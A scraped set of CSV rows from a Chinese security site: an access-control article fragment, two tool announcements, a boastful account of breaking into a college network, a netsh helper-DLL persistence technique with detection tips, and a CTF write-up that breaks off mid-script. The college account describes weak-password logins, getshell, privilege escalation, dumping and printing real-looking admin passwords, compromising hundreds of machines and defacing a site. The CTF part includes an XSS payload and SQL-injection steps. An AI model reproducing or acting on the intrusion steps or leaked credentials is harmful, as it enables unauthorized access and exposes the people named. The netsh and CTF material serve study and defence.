Linux等）采用的访问控制方式。同时，它也是信息安全管理系统中经常采用的访问控制方式。例如，在亿赛通文档安全管理系统SmartSec中，客户端 提供的“文件访问控制”模块就是通过ACL方式进行实现的。3.2. 访问控制矩阵访问控制矩阵（ACM：Access Control  Matrix）是通过矩阵形式表示访问控制规则和授权用户权限的方法；也就是说，对每个主体而言，都拥有对哪些客体的哪些访问权限；而对客体而言，有哪些 主体可对它实施访问；将这种关联关系加以描述，就形成了控制矩阵。访问控制矩阵的实现很易于理解，但是查找和实现起来有一定的难度，特别是当用户和文件系 统要管理的文件很多时，控制矩阵将会呈几何级数增长，会占用大量的系统资源，引起系统性能的下降。3.3. 访问控制能力列表能力是访问控制中的一个重要概念，它是指请求访问的发起者所拥有的一个有效标签（Ticket），它授权标签表明的持有者可以按照何种访问方式访问特定的 客体。与ACL以文件为中心不同，访问控制能力表（ACCL：Access Control Capabilities  List）是以用户为中心建立访问权限表。3.4. 访问控制安全标签列表安全标签是限制和附属在主体或客体上的一组安全属性信息。安全标签的含义比能力更为广泛和严格，因为它实际上还建立了一个严格的安全等级集合。访问控制标 签列表（ACSLL：Access Control Security Labels List）是限定用户对客体目标访问的安全属性集合。4. 访问控制与授权授权是资源的所有者或控制者准许他人访问这些资源，是实现访问控制的前提。对于简单的个体和不太复杂的群体，我们可以考虑基于个人和组的授权，即便是这种 实现，管理起来也有可能是困难的。当我们面临的对象是一个大型跨地区、甚至跨国集团时，如何通过正确的授权以便保证合法的用户使用公司公布的资源，而不合 法的用户不能得到访问控制的权限，这是一个复杂的问题。授权是指客体授予主体一定的权力，通过这种权力，主体可以对客体执行某种行为，例如登陆，查看文件、修改数据、管理帐户等。授权行为是指主体履行被 客体授予权力的那些活动。因此，访问控制与授权密不可分。授权表示的是一种信任关系，一般需要建立一种模型对这种关系进行描述，才能保证授权的正确性，特 别是在大型系统的授权中，没有信任关系模型做指导，要保证合理的授权行为几乎是不可想象的。例如，在亿赛通文档安全管理系统SmartSec中，服务器端 的用户管理、文档流转等模块的研发，就是建立在信任模型的基础上研发成功的，从而能够保证在复杂的系统中，文档能够被正确地流转和使用。5. 访问控制与审计审计是对访问控制的必要补充，是访问控制的一个重要内容。审计会对用户使用何种信息资源、使用的时间、以及如何使用（执行何种操作）进行记录与监控。审计 和监控是实现系统安全的最后一道防线，处于系统的最高层。审计与监控能够再现原有的进程和问题，这对于责任追查和数据恢复非常有必要。  审计跟踪是系统活动的流水记录。该记录按事件从始至终的途径，顺序检查、审查和检验每个事件的环境及活动。审计跟踪记录系统活动和用户活动。系统活动包括 操作系统和应用程序进程的活动；用户活动包括用户在操作系统中和应用程序中的活动。通过借助适当的工具和规程，审计跟踪可以发现违反安全策略的活动、影响 运行效率的问题以及程序中的错误。审计跟踪不但有助于帮助系统管理员确保系统及其资源免遭非法授权用户的侵害，同时还能提供对数据恢复的帮助。例如，在亿 赛通文档安全管理系统SmartSec中，客户端的“文件访问审核日志”模块能够跟踪用户的多种日常活动，特别是能够跟踪记录用户与工作相关的各种活动情 况，如什么时间编辑什么文档等。","2016-07-29 14:34:08","网络安全","数据安全保护之访问控制技术","http://nsoad.com/Article/Network-security/20160729/214.html"
"5ccbfb5c4f2f0a0a7a69c158","经常看到有文章推荐用这个子域名挖掘的小工具，但之前都没好好写，代码很乱，效率也不高，有时候还经常崩溃，既然大家这么喜欢用，那干脆今晚抽了点时间全部重写了下，新版","blackhold","经常看到有文章推荐用这个子域名挖掘的小工具，但之前都没好好写，代码很乱，效率也不高，有时候还经常崩溃，既然大家这么喜欢用，那干脆今晚抽了点时间全部重写了下，新版更稳定，也加入了更实用的端口探测功能，可以在挖掘子域名的同时扫描端口。优化详情：1、新起项目，代码全部重写，性能更优更稳定。2、增加子端口探测功能，方便渗透测试。3、增加DNS服务器切换和自定义，目前测试DNSPOD最快，个人测试最快达到了每秒3000+条验证，速度比上个版本增加5–10倍（速度会越跑越快）。切换DNS服务器也可以避免进行大量DNS查询的时候影响正常上网。4、对字典权重进行了调整，更容易命中的排在更前。5、增加升级提醒，如果还有下个版本的话，会有提醒。特别提醒：基于.NET4.5编译，得安装.NET4.5才能用 ^_^程序下载地址：链接: https://pan.baidu.com/s/1eS9hbua 密码: v6rj源码下载地址：https://pan.baidu.com/s/1qXURfzuBTW：我也不知道360这个傻逼为什么会报毒。","2016-11-15 15:08:49","安全工具","Layer 子域名挖掘机4.1 全新重构+175万大字典","http://nsoad.com/Security-tools/20161115/tools-778.html"
"5ccbfb5c4f2f0a0a7a69c159","某信息工程学院渗透测试","blackhold","某信息工程学院渗透测试                                                       2016/7/12  用时两天各位表哥，看完觉得写的好的话，或者某些地方不足之处不要忘记评论哦。我会在你们评论中不断改进的.纯属娱乐，并无恶意以下漏洞已提交至管理员 并且已完美修复...警告：以下内容可能令你感到不适.如果感到不适请立即把硬盘拔了丢水里，冷静冷静 目标站点：www.xxxxx.com思路   目标服务器（常用端口） ——&gt; C段 （常用端口) （各种可能出现的漏洞）经过十几分钟的信息收集（请无视这句话写来装逼用的） 发现某系统存在弱口令一枚www.xxxxx.com：8081  admin admin 成功进入后台，然后发现一处任意文件上传 完美getshell（任意格式文件上传）没办法人帅............怎么帅.？.就算安全狗见了我，都要自动停止运行的那种帅气与机智.. KB956572 没打补丁    成功溢出system权限 然后...建立用户  3389 连之..Win 2003 server 直接getpass  读取管理员明文密码，以便进一步撸内网..（收集口令是撸内网常规思路...其他杀马特思路我也不知道，啊哈哈，技术有限） UserName: lixinpengLogonDomain: SERVER-FUPTpassword: gzmodern@@107接下来ipconfig看看 ip 10.0.1.210这个时候有同学就会问了....你这特么不是内网的么 你怎么连接上的.....解：目测这台机确实在内网，这应该是他们学校自己用路由把3389映射到外网的..为了方便管理嘛...好了本次渗透到此结束............如果这个时候结束的的话...我估计会被傻吊蛋蛋打死... （写得太少了...） 对于新手来说，这确实..可能是结束..但是对于我这种屌丝来说...好戏才刚刚开始就像烫死三百首里面有古寺怎么说的来着...    Sometimes when you think it's over, it's just the beginning.-李白这个时候 我从兜里掏出我的神器. hscan把刚刚收集到的密码添加进去 然后对着 10.0.1.1-10.0.1.255 就是一阵乱扫..然后发现 内网 10.0.1.115  mssql 空口令 进一步提权之  sa提权都会把？当然不会也没关系，请出门左拐，直行50m就是wc，跳下去把...记得顺手关门...然后判断该服务器是 财务室的服务器然而搞到这个也没什么卵用...还是getpass把管理员密码搞到手把UserName: AdministratorLogonDomain: SERVERpassword: ADMIN123456然后添加到字典 继续扫...（循环几次保证内网日穿）怎摸样这思路风骚吧 紧接着.....................  校园网计费服务器沦陷....  同学 要不要我帮你把钱充满？ 这特么用的是锐捷的收费系统，也是数据库弱口令搞下的..  这管理员来就应该被拖出去打死..我特么...我...我先去撒个尿....憋不住的了.当时我就在想，要是我在这个学校读书.我特么就可以免费上网了  哈哈哈哈哈！好幸福的感觉..  接下来 发现这ip段  172.16.33.1-172.16.33.255   是一个教室的ip段....服务器名称            注释----------------------------\\ST303-01\\ST303-02\\ST303-03\\ST303-04\\ST303-05\\ST303-06\\ST303-07\\ST303-08\\ST303-09\\ST303-10\\ST303-11\\ST303-12\\ST303-13\\ST303-14\\ST303-15\\ST303-17\\ST303-18\\ST303-19\\ST303-20\\ST303-21\\ST303-22\\ST303-23\\ST303-24\\ST303-25\\ST303-26\\ST303-28\\ST303-29\\ST303-31\\ST303-32\\ST303-33\\ST303-34\\ST303-35\\ST303-36\\ST303-37\\ST303-38\\ST303-40\\ST303-41\\ST303-42\\ST303-43\\ST303-44\\ST303-45\\ST303-46\\ST303-47\\ST303-48\\ST303-49\\ST303-50\\ST303-51\\ST303-52\\ST303-53\\ST303-54\\ST303-55\\ST303-56\\ST303-57\\ST303-58\\ST303-59\\ST303-60然后..额....然后...全部被强奸...... 随便找个机子测试.. 也是sa弱口令..秒日..然后发现 172.16.35.1-172.16.35.255这个ip段 也是教室学生用的电脑也全部玩完.. 到现在...内网已经有上百台电脑被强奸了... 搞着搞着觉得..内网太那个啥了...我们的视线再回到第一台服务器哪里去.. 其实我一开始就看到iis这里面的东西了，当时我改了首页，但是官网首页没反应...但是发现这里网站确实和主站一样的啊... 目录，文件什么都一样..但是特么改了主页为啥没反应啊然后想到..这是不是传说中的热备份啊！（求懂的大神给我正解~..）然后发现里面有管理员帐号密码 我日... 不禁感叹道..上帝给我关了一道门..却给我开了一扇窗... 然后屁颠屁颠的跑去解密..查询结果：                                                                         未查到,已加入本站后台解密，完成进度:0%请注册并登录查询，若解密成功自动给你发送邮件通知。...........我............我特么醉了...然后在那iis里面找到了后台，用刚刚服务器登录密码试试  没想到...人品大爆发..然后........然后我特么修改了首页...  我估计有人就会骂我了..这特么不是小学生么..日站还挂黑页..！其实各位表哥 .我是有苦衷的啊~    我学校不是你想侮辱就侮辱的！最后提醒各位表哥一下..日站有风险，装逼需谨慎  有人会说，这篇文章内容不就是弱口令么..no no no 你这样理解就错了，弱口令？你怎么没遇到呢？这不是人品！这不是运气！不是我长得帅！ 这是 渗透思路！思路到位 拿着御剑burp日天下！","2016-10-02 17:06:15","Web安全","某信息工程学院渗透测试","http://nsoad.com/Article/web/20161002/482.html"
"5ccbfb5c4f2f0a0a7a69c15a","最近在读一些有zend 5.4加密的代码，之前的黑刀无法解密5.4，网上找了下发现大多要收费，有一个工具叫G-DeZender能解5.4，但是未付费版本每点一次只能解密一个文件，这TM四五千个文件点完会死人的。","seay","最近在读一些有zend 5.4加密的代码，之前的黑刀无法解密5.4，网上找了下发现大多要收费，有一个工具叫G-DeZender能解5.4，但是未付费版本每点一次只能解密一个文件，这TM四五千个文件点完会死人的。丢给公司的小莫同志研究了下，抓了下这个程序的进程，发现这个程序也是调用的本地文件去解密，那直接写个循环调用不就完了。。。花了点时间抄了个SeayDzend，支持zend 5.2，zend5.3，zend5.4 的解密，造福下大众。下载地址：https://pan.baidu.com/s/1c14V6pi","2017-02-05 22:54:04","安全工具","免费Zend 5.2 5.3 5.4解密工具","http://nsoad.com/Security-tools/20170205/tools-1045.html"
"5ccbfb664f2f0a0a7a69c15b","作者真是细心，从netsh的add参数发现可以载入任意DLL执行，唯一的限制仅仅是需要在注册表的HKLM\SOFTWARE\Microsoft\Netsh具有写权限。并且通过计划任务运行netsh实现持久化的话，默认情况下使用AutoRu","Kong","安全客点评作者真是细心，从netsh的add参数发现可以载入任意DLL执行，唯一的限制仅仅是需要在注册表的HKLM\SOFTWARE\Microsoft\Netsh具有写权限。并且通过计划任务运行netsh实现持久化的话，默认情况下使用AutoRuns是看不到的。已经有其他研究人员公布了可以持久化利用的POC代码 https://github.com/outflankbv/NetshHelperBeacon，有兴趣的同学可以学习下。 写在前面的话最近我一直都在思考一个问题，我想知道怎么样才能通过“受信任”的方法来在目标系统中执行恶意代码。我喜欢站在攻击者的角度来思考，如果我是攻击者，我会怎么做呢？毫无疑问，第一个浮现在各位脑海中的肯定是PowerShell了，它的确是系统管理员和黑客们心中的“挚爱”。反病毒软件并不会在意你的PowerShell准备干嘛，Virustotal也不会认为你的PowerShell脚本有什么问题。在这篇文章中，我并不打算跟大家讲解关于PowerShell的攻击方法，因为如果我要讲的话，我今晚就可以不用回家了。你要时刻谨记：管理员能使用的资源，攻击者同样可以使用。毕竟，当某人成功入侵了你的网络系统之后，你没有任何方法来区分出某一操作到底是由合法用户完成的， 还是由入侵者完成的，真的一点办法都没有。很多工具都有可能会泄漏你的系统信息，“Ipconfig”看起来是一个无害的命令，但是这个命令将会给攻击者提供很多有价值的信息。除了这个命令之外，还有无数的命令将有可能威胁到系统的安全。实际上，Windows操作系统中自带的一些命令和工具对于黑客而言是非常有价值的，因为攻击者不仅可以直接使用这些现成的工具来入侵你的网络，而且还可以避免被安全防护系统检测到。为此，我给大家提供了一份包含有系统本地命令的列表，这些命令都是攻击者在此前的一些网络攻击事件中曾经使用过的命令。［点我获取］最令人感到沮丧的是，这份列表中的绝大多数命令基本上都是我们经常会用到的，而且这些都是合法命令。你不可能直接将ipconfig.exe直接丢到黑名单中，因为你的用户肯定会因此而恼羞成怒。这些命令其实并不是可以用来识别攻击活动的入侵指标，但是在某些特殊的环境下，我们也可以通过这些命令来识别攻击活动。言归正传好了，让我们回到正题。在此之前，我一直在研究Windows防火墙命令行工具－netsh（NetShell）到底能为攻击者做什么。当我在查阅上面这份列表的时候，我发现了一个非常有意思的参数：“add”。“add”参数有什么用？我们可以添加什么？安装一个DLL？我不会是眼花了吧？实践出真知，于是我找出了一个用来运行calc.exe（计算器）的DLL来进行测试。我觉得系统应该不会直接运行它，因为这根本说不通啊。结果如上图所示，系统果然没有直接运行这个DLL。那么问题来了，InitHelperDLL是什么呢？中文问百度，英文问Google，于是我便打开Google搜索了一下。根据微软公司的描述：InitHelperDLL是一个由NetShell调用的函数，该函数负责执行helper的初始化加载。关于InitHelperDLL的详细内容请参阅微软公司的官方文档［点我访问］。好的，那么helper又是什么呢？NetShell的helper其实就是一种可以提供context功能的DLL文件。额外的helper可以扩展NetShell的功能，因为helper还可以提供负责处理网络任务的管理脚本。通常情况下，Helper可以为网络服务、实用工具、或者协议提供配置支持和监控支持。关于NetShell Helper的详细内容请参阅微软公司的官方文档［点我访问］。走到这里，我决定要向Casey Smith（@subTee）求助了，Casey所擅长的就是使用一些“特殊”的方法来在Windows系统中执行各种命令。他在自己博客的一篇文章中对这一主题进行了非常详细的讲解，感兴趣的同学可以查阅一下［点我阅读］。我当时问他是否听说过这种攻击技术，他说他从未听说过。但是几分钟之后，他就弄出了一个可以运行的PoC实例。那么，接下来我们应该做什么呢？思考片刻之后，我打算通过“delete helper &lt;PATH&gt;”命令来 “逆向分析”一下我刚才所做的事情。于是我重新打开了一个命令行窗口，然后删除掉刚才的这个条目。结果如下图所示：没错，我们的DLL又被执行了，原来这是一种持久化的操作。于是，我又回头仔细查阅了关于NetShell Helper的相关章节，我又发现了下面这段内容。Helper是一种DLL文件，它可以实现一个NetShell context(NetShell上下文)以及零个或多个subcontext(子上下文)，这些DLL文件都是通过Windows的系统注册表来实现注册的。详细内容请参阅微软的官方文档［点我查看］。通过系统的注册表！系统的注册表！注册表！重要的事情说三遍！现在越来越有意思了，让我们打开注册表，然后搜索一下我刚才提交的那个DLL文件。我在注册表的“HKLM\SOFTWARE\Microsoft\Netsh”键中发现了关于这个DLL的条目。所有其他的DLL文件都在System文件夹中，但是你的恶意DLL并不需要满足这一要求，我们可以直接运行任何来源的DLL。我建议各位可以将恶意DLL文件放置在一个任何用户都可以直接访问到的存储位置，例如System文件夹或者AppData文件夹中，但是在存放DLL的这个过程中你还是需要使用管理员权限才行。如果你没有管理员权限，那么你至少也要获取注册表条目的写入权限。这里唯一需要注意的是，如果想要保证DLL能够顺利执行，那么netsh.exe必须先运行起来。系统启动之后，默认情况下Netsh并不会自动运行，但是你可以使用计划任务来完成这项操作。除此之外，你也可以通过系统服务或Powershell脚本来实现。用户无法在系统的“自动运行”视图中查看到netsh.exe的计划任务。如果你想要查看netsh的计划任务，那么就需要勾选掉“隐藏Windows条目”这个选项。你也可以从下图中看到，VirusTotal并没有检测到任何异常。我知道目前有很多的VPN客户端程序因为各种各样的原因需要经常去使用netsh。通常情况下，他们运行在SYSTEM环境中。所以根据目标系统的运行环境，我们也许根本都不用去强迫netsh运行。这就是为什么黑客在攻击之前往往需要侦查目标环境的原因了，这是一个非常重要的步骤。这样你就可以避免走很多的弯路，并且节省下大量的时间。从防御端来看，如果你正在使用Sysmon（一款系统监视软件，我强烈建议广大用户使用这款软件）来对系统的运行进程进行实时监控的话，你就可以查看到netsh.exe的所有子进程了。如何检测并阻止这类攻击？ 1.     很明显，我们可以扫描“HKLM\SOFTWARE\Microsoft\Netsh”注册表键中的新条目，这是最简单的一种方法。2.     你的团队应该监控注册表的状态，任何通过CMD、Powershell、或者WMI来修改注册表的操作都应该被记录下来。虽然这种情况经常会发生，而且这很有可能需要花费大量的时间。但是如果能够发现异常活动的话，这点投入还是值得的。3.     用户也可以使用DLL白名单，微软的Applocker可以允许用户配置DLL文件的执行策略。总结 我的这一发现到底有多么重要？我自己也不太清楚。但是，这确实是攻击者可以利用的一种攻击方法。请记住，处于防御端的人必须要想办法检测并阻止所有可能的攻击手段，而攻击者在攻击的过程中只需要使用一种方法即可。所以信息安全攻防从来就不是一个公平的游戏。","2016-09-29 11:22:59","Web安全","使用Netshell执行恶意DLL并实现对目标主机的持久化攻击","http://nsoad.com/Article/web/20160929/463.html"
"5ccbfb664f2f0a0a7a69c15c","最新2016华山杯CTF writeup","silence","2016 华山杯 网络安全技能大赛 解题报告队伍: FlappyPig Web渗透0x01 打不过~添加type=”submin”，点击提交抓包有一串字符串，base64-&gt;md5，1931b。提交getflag 0x02 系统管理源码有代码，先找0e开头的md5，然后user.php，直接反序列化绕过0x03 简单js看了下js,直接alert(a)    142080x04 弹弹弹！&lt;img src=1 onerror=alert(1)&gt;0x05 233Jsfuck，解密后是一句话用工具解不开，直接自己写脚本吧ANSI-&gt;Unicode0x06 无间道这题怀疑出错了吧，函数的都没定义，咋传？还没get到出题人的意图，通过下一题直接读的源码0x07 php很烦人先看源码，用php://input改成admin，然后可以直接读文件，index中有个class.php&lt;span style=""color: rgb(0, 0, 0);""&gt;&lt;?php&lt;br&gt;class Read{//f1a9.php&lt;br&gt;    public $file;&lt;br&gt;    public function __toString(){&lt;br&gt;        if(isset($this-&gt;file)){&lt;br&gt;            echo file_get_contents($this-&gt;file);    &lt;br&gt;        }&lt;br&gt;        return ""__toString was called!"";&lt;br&gt;    }&lt;br&gt;}&lt;br&gt;&lt;/span&gt;没法直接读f1a9.php,反序列化去读0x08 More try靠上个题读到源码，然后看了下role有注入，还有两层base64Sqlmap有个base64encode.py的tamper，所以自己改下，改成两层然后sqlmap.py –r –tamper=”base2.py” –v 3 ,the_key表，key字段0x0A 三秒钟记忆http://huashan.xdsec.cn/pic/login这里可以看到源码，重置密码的地方可以二次注入注册的时候带’的用户名，然后重置密码的时候会注入‘ and LEFT ((select flag from flag),x)=’ flag_Xd{hSh_ctf:dutwq}’如果充值成功了，密码就会变，所以就无法登陆了，写脚本跑下就好了,太慢了……0x0B 疯狂的js这个是plaidctf2014的原题，不过改了一个地方，var args = [].slice.apply(arguments).sort().filter(function(x,i,a){return a.indexOf(x) == i;});if(args.length != 5) return ""数够参数了吗？"";var flag = false; args.map(function(x){flag |= x &gt;= 999;});if(flag) return ""有点大了哦"";var m = args.map(cal);if(m.filter(function(x,i){return m[2]+3*i==x;}).length &lt; 1) return ""no"";if(m.filter(function(x,i){return x == args[i];}).length &lt; 2) return ""nono"";if(m.filter(function(x,i){return x &gt; m[i-1];}).length &gt; 2) return ""bala"";if(m.filter(function(x,i){return x &lt; m[i-1];}).length &gt; 1) return ""balana~"";满足条件即可弹出flag五次分别输入2.02.00676949Reverse逆向破解0x01 Crackme1. Warming Up代码就是个简单变化，动态跟了几步，发现进行了如下操作：""""""xor 0x30 ^ 1xor 0x32 ^ 2xor 0x33 ^ 3xor 0x34 ^ 1xor 0x35 ^ 2""""""最后进行字符串比较，反过来写下就可以，如下：target = ""VgobmndVlBVE""result = """"for index, item in enumerate(target):         result += chr(ord(item)^(((index)%3)+1))print result0x02 Crackme2. 到手的钥匙这题的逻辑就不是常人的，有两个用户名和密码。开始那个还正常点用户名：amdin，密码的md5值知道，然后反查了下值为：xdadmin 但是输完并没有什么用，提交也不对：后来发现另外一个函数也用到了用户名密码，如下：输入3247,5569得到如下：组合下输出的结果，提交不对，，，，，，，，，，不对啊，，，，，，，，，，仔细看代码，没别的逻辑了啊，，，，纠结了好久突然队友提交了“用户名+密码+输出”的结果，通过。。。。。。。。竟然通过了。。。。。。。。。0x03 Crackme3. 探囊取物题目是个图片，直接strings crackme3.jpg，得到一串01目测可以拼出来字，一共1177个，11*1070x04 Crackme4. 移动迷宫代码就是个简单的走迷宫，图如下：输入的东西，进行各简单变化，对应于走的方向，如下：走的逻辑如下：根据坐标生成方向即可，逆代码如下：&lt;span style=""color: rgb(0, 0, 0);""&gt;map_info = ""***********####******#**#*****##*##********#*********#*#####***###***#*********#*********#********##""&lt;br&gt;result = """"&lt;br&gt;x = 0&lt;br&gt;y = 0&lt;br&gt;pos_list = []&lt;br&gt;for i in range(len(map_info)):&lt;br&gt;         result += map_info[i]&lt;br&gt;         y = (i)%10&lt;br&gt;         x = i/10&lt;br&gt;         if (i+1)%10 == 0:&lt;br&gt;                   result += ""\n""&lt;br&gt;         if map_info[i] == ""#"":&lt;br&gt;                   pos_list.append((x, y))&lt;br&gt;print map_info[0x28]&lt;br&gt;print result&lt;br&gt;print pos_list&lt;br&gt;last = 0&lt;br&gt;way_list = []&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((0,-1))&lt;br&gt;way_list.append((0,-1))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((-1,0))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((0,-1))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((1,0))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((0,1))&lt;br&gt;way_list.append((-1,0))&lt;br&gt;print len(way_list)&lt;br&gt;map_dic = {}&lt;br&gt;map_dic[(-1, 0)] = 3&lt;br&gt;map_dic[(1, 0)] = 4&lt;br&gt;map_dic[(0, -1)] = 1&lt;br&gt;map_dic[(0, 1)] = 2&lt;br&gt;result = []&lt;br&gt;for i in way_list:&lt;br&gt;         result.append(map_dic[i])&lt;br&gt;way_key = """"""0A1B&lt;br&gt;a2b3&lt;br&gt;4C5D&lt;br&gt;c6d7&lt;br&gt;8E9F&lt;br&gt;e0f1""""""&lt;br&gt;way_key = way_key.split(""\n"")&lt;br&gt;print result&lt;br&gt;print len(result)&lt;br&gt;result_info = """"&lt;br&gt;for i in range(4):&lt;br&gt;         for j in range(6):&lt;br&gt;                   result_info += way_key[j][result[i*6+j]-1]&lt;br&gt;print way_key&lt;br&gt;print result_info&lt;br&gt;&lt;/span&gt;flag如下：最后一行0x05 Crackme5. Do something虽然题目给了个jpg，但其实是个程序，主要的判断逻辑如下：&lt;span style=""color: rgb(0, 0, 0);""&gt;int __cdecl sub_401000(char *Src)&lt;br&gt;{&lt;br&gt;  char Dst[20]; // [sp+0h] [bp-14h]@1&lt;br&gt;  Dst[0] = byte_415282;&lt;br&gt;  *(_DWORD *)&amp;Dst[1] = 0;&lt;br&gt;  *(_DWORD *)&amp;Dst[5] = 0;&lt;br&gt;  *(_DWORD *)&amp;Dst[9] = 0;&lt;br&gt;  *(_DWORD *)&amp;Dst[13] = 0;&lt;br&gt;  *(_WORD *)&amp;Dst[17] = 0;&lt;br&gt;  Dst[19] = 0;&lt;br&gt;  strcpy_s(Dst, 17u, Src);&lt;br&gt;  check_equ_401320(Dst[0], Dst[8]);&lt;br&gt;  check_equ_401320(Dst[0], Dst[9]);&lt;br&gt;  check_equ_401320(Dst[1], Dst[10]);&lt;br&gt;  check_equ_401320(Dst[2], Dst[4]);&lt;br&gt;  check_equ_401320(Dst[3], Dst[5]);&lt;br&gt;  check_equ_401320(Dst[11], 5);&lt;br&gt;  check_equ_401320(Dst[7], 3 * Dst[11]);&lt;br&gt;  check_bigger_401350(Dst[12], 5 * Dst[14]);&lt;br&gt;  check_equ_401320(Dst[13], 2 * Dst[12]);&lt;br&gt;  check_bigger_401350(Dst[3], 3 * Dst[12]);&lt;br&gt;  check_bigger_401350(Dst[0], Dst[3]);&lt;br&gt;  check_bigger_401350(21, Dst[0]);&lt;br&gt;  check_equ_401320(Dst[0], Dst[6] + Dst[12]);&lt;br&gt;  check_equ_401320(Dst[6], 2 * Dst[15]);&lt;br&gt;  check_bigger_401350(Dst[2], 4 * Dst[14]);&lt;br&gt;  check_bigger_401350(Dst[6], Dst[2]);&lt;br&gt;  if ( Dst[2] % 3 )&lt;br&gt;  {&lt;br&gt;    printf(aNextTime);&lt;br&gt;    sub_40E644();&lt;br&gt;    exit(0);&lt;br&gt;  }&lt;br&gt;  check_bigger_401350(Dst[1], 7);&lt;br&gt;  check_bigger_401350(Dst[2], Dst[1]);&lt;br&gt;  return check_bigger_401350(Dst[0], Dst[1] + Dst[2]);&lt;br&gt;}&lt;br&gt;&lt;/span&gt;就是一些列的条件，满足就会输出得到了flag，约束如下：&lt;span style=""color: rgb(0, 0, 0);""&gt;Dst[0] = Dst[8]&lt;br&gt;Dst[0] == Dst[9]&lt;br&gt;Dst[1] == Dst[10]&lt;br&gt;Dst[2] == Dst[4]&lt;br&gt;Dst[3] == Dst[5]&lt;br&gt;Dst[11] == 5&lt;br&gt;Dst[7] == 3 * Dst[11]&lt;br&gt;Dst[12] &gt; 5 * Dst[14]&lt;br&gt;Dst[13] == 2 * Dst[12]&lt;br&gt;Dst[3] &gt; 3 * Dst[12]&lt;br&gt;Dst[0] &gt; Dst[3]&lt;br&gt;21 &gt; Dst[0]&lt;br&gt;Dst[0] == Dst[6] + Dst[12]&lt;br&gt;Dst[6] == 2 * Dst[15]&lt;br&gt;Dst[2] &gt; 4 * Dst[14]&lt;br&gt;Dst[6] &gt; Dst[2]&lt;br&gt;Dst[2] % 3 == 0&lt;br&gt;Dst[1] &gt; 7&lt;br&gt;Dst[2] &gt; Dst[1]&lt;br&gt;Dst[0] &gt; Dst[1] + Dst[2])&lt;br&gt;&lt;/span&gt;直接用个求解器求解即可，结果如下：直接算出与加上0x60即可得到flag，如下：0x06 Crackme6. Help me这题目就是运行得时候，对一些不可访问的地址进行了写入，导致崩溃，看代码貌似是专门这样写的，如下：直接对[0x10]处进行了赋值，程序这样的位置还有好几处，如下：直接对其进行nop，然后将输出，转成printf即可，如下:Flag直接就打印出来了，如下：0x08 Crackme8. 忘记用户名代码就很简单，如下图：直接计算即可， 代码如下：info = ""ILoveXD""result_info = """"for i in range(7):    result_info += chr(ord(info[i])+7-i)print result_info结果如下：0x09 Crackme9. 捉迷藏用户名: FindKey密码：T25Zb3VyQ29tcHV0ZXI= base64解码得: OnYourComputer生成了一个flag.jpg，里面的内容为FindKeyOnYourComputerArvinShowFlag的品相好差。Crypto加密解密0x01 紧急报文ADFGX加密0x02 is it x or z ?给了3个文件 clear-1.txt crypt-1.txt和crypt-2.txt，用clear-1.txt和crypt-1.txt异或可以得到重复循环的片段，推测循环节即为密钥，用该密钥解密crypt-2即可得到flag0x03 分组加密模式检测这是个原题，见这里：https://github.com/truongkma/ctf-tools/tree/master/cryptopals-solutions-master/set1/8主要就是从一大堆CBC密文里检测出ECB密文，脚本一模一样抄即可。0x04 修复一下这份邀请函的部分内容打开就是flag，明文，直接交flag_Xd{hSh_ctf:flag xie can xie yu hen xing gao}0x0 5协议？认证？加密？这题先进行了DH交换密钥，然后用交换后的密钥加密的flag。A B P都不是很大，猜想这个离散对数问题比较容易解。https://www.alpertron.com.ar/DILOG.HTM用这个工具可以直接求解出离散对数算出a的私有指数，然后计算B^a就作为密钥了。但是这题有一个地方很坑，得到的密钥只有8个字节，但是AES需要16个字节作为密钥，一开始卡这里卡了很久。后来才脑洞出来高位全部补\x00，然后解完发现后一半flag是乱码，又是很坑，后来用CBC模式试了一下，iv取全0，解出来才正常。0x06 时间决定一切web的任意文件读取，直接读源码 Android0x01 错错错这题算法其实很简单，就是对随机字符串进行啦哈希操作然后进行一个替换作为密码。由于运行的时候用的hash函数是随机的，所以4个都试一下。&lt;span style=""color: rgb(0, 0, 0);""&gt;#!/usr/bin/env python&lt;br&gt;import hashlib&lt;br&gt;dic = ""AabRcQPXdYVeTWUSfghijklCmDnEoGpqFrHsItKJLuvwxyz01M23O45N67Z89B""&lt;br&gt;serial = ""skxxRWi23""&lt;br&gt;for i in range(4):&lt;br&gt;         ans = ''&lt;br&gt;         if (i==0):&lt;br&gt;                   enc = hashlib.md5(serial).hexdigest()&lt;br&gt;                   for j in range(8):&lt;br&gt;                            ans += str(dic.index(enc[j]))&lt;br&gt;                   print enc&lt;br&gt;                   print ans&lt;br&gt;         if (i==1):&lt;br&gt;                   enc = hashlib.sha1(serial).hexdigest()&lt;br&gt;                   for j in range(8):&lt;br&gt;                            ans += str(dic.index(enc[j]))&lt;br&gt;                   print enc&lt;br&gt;                   print ans&lt;br&gt;         if (i==2):&lt;br&gt;                   enc = hashlib.sha256(serial).hexdigest()&lt;br&gt;                   for j in range(8):&lt;br&gt;                            ans += str(dic.index(enc[j]))&lt;br&gt;                   print enc&lt;br&gt;                   print ans&lt;br&gt;         if (i==3):&lt;br&gt;                   enc = hashlib.sha384(serial).hexdigest()&lt;br&gt;                   for j in range(8):&lt;br&gt;                            ans += str(dic.index(enc[j]))&lt;br&gt;                   print enc&lt;br&gt;                   print ans&lt;br&gt;&lt;/span&gt;最后尝试发现：序列号：skxxRWi23哈希值：521c0892b9dc0a7026fbe9664e6a339e7fee9492605733ea09968fbd83f18dfff91fe87d9d620fa4d3dd3010b47495dc解锁码：545048447596050这一是正确的。0x02 寻找密码这题其实是给apk加了个壳，程序里把真实的apk经过了加密(异或255)拼到了apk的dex文件后面，所以我直接把dex文件提取出来，整个文件异或255，然后从第一个PK开始提取出原始APK。然后原始的APK扔到jeb里就很容易看出源代码了。算法很简单：&lt;span style=""color: rgb(0, 0, 0);""&gt;#!/usr/bin/env python&lt;br&gt;import base64&lt;br&gt;import hashlib&lt;br&gt;username = 